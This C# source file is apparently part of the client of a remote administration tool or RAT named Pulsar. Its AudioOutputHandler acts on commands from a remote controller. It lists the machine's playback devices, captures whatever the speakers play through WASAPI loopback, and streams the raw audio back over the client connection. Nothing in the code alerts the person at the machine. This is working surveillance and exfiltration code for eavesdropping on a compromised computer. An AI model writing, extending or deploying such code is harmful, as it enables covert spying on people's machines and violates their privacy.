using NAudio.CoreAudioApi;
using NAudio.Wave;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Audio;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Pulsar.Client.Messages
{
    public class AudioOutputHandler : NotificationMessageProcessor, IDisposable
    {
        public override bool CanExecute(IMessage message) => message is GetOutput ||
                                                             message is GetOutputDevice;
        public override bool CanExecuteFrom(ISender sender) => true;

        public ISender _client;

        bool _isStarted;

        public WasapiLoopbackCapture _audioDevice;

        int _deviceID;

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetOutput msg:
                    Execute(sender, msg);
                    break;
                case GetOutputDevice msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetOutput message)
        {
            if (message.CreateNew)
            {
                _isStarted = false;
                _audioDevice?.Dispose();
                OnReport("Speaker audio streaming started");
            }
            if (message.Destroy)
            {
                Destroy();
                OnReport("Speaker audio streaming stopped");
                return;
            }
            if (_client == null) _client = client;
            if (!_isStarted)
            {
                try
                {
                    _deviceID = message.DeviceIndex;
                    var enumerator = new MMDeviceEnumerator();
                    var devices = enumerator.EnumerateAudioEndPoints(DataFlow.Render, DeviceState.Active);
                    var device = devices[_deviceID];
                    int sampleRate = message.Bitrate;
                    int channels = device.AudioClient.MixFormat.Channels;
                    var waveFormat = new WaveFormat(sampleRate, channels);
                    _audioDevice = new WasapiLoopbackCapture(device);
                    _audioDevice.WaveFormat = waveFormat;

                    _audioDevice.DataAvailable += sourcestream_DataAvailable;
                    _audioDevice.StartRecording();
                    _isStarted = true;
                }
                catch (Exception ex)
                {
                    Debug.WriteLine(ex.Message);
                }
            }
        }

        private void sourcestream_DataAvailable(object sender, WaveInEventArgs e)
        {
            byte[] bufferCopy = new byte[e.BytesRecorded];
            Array.Copy(e.Buffer, bufferCopy, e.BytesRecorded);

            Task.Run(() =>
            {
                try
                {
                    _client.Send(new GetOutputResponse
                    {
                        Audio = bufferCopy,
                        Device = _deviceID
                    });
                }
                catch (Exception ex)
                {
                    OnReport($"Error sending audio data: {ex.Message}");
                }
            });
        }


        private void Execute(ISender client, GetOutputDevice message)
        {
            var deviceList = new List<Tuple<int, string>>();
            var enumerator = new MMDeviceEnumerator();
            var devices = enumerator.EnumerateAudioEndPoints(DataFlow.Render, DeviceState.Active);

            for (int i = 0; i < devices.Count; i++)
            {
                var deviceName = devices[i].FriendlyName;
                deviceList.Add(Tuple.Create(i, deviceName));
            }
            enumerator.Dispose();

            client.Send(new GetOutputDeviceResponse { DeviceInfos = deviceList });
        }

        public void Destroy()
        {
            if (_audioDevice != null)
            {
                _audioDevice.DataAvailable -= sourcestream_DataAvailable;
                _audioDevice.StopRecording();
                _audioDevice.Dispose();
                _audioDevice = null;
            }
            _isStarted = false;
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                _audioDevice?.Dispose();
            }
        }
    }
}
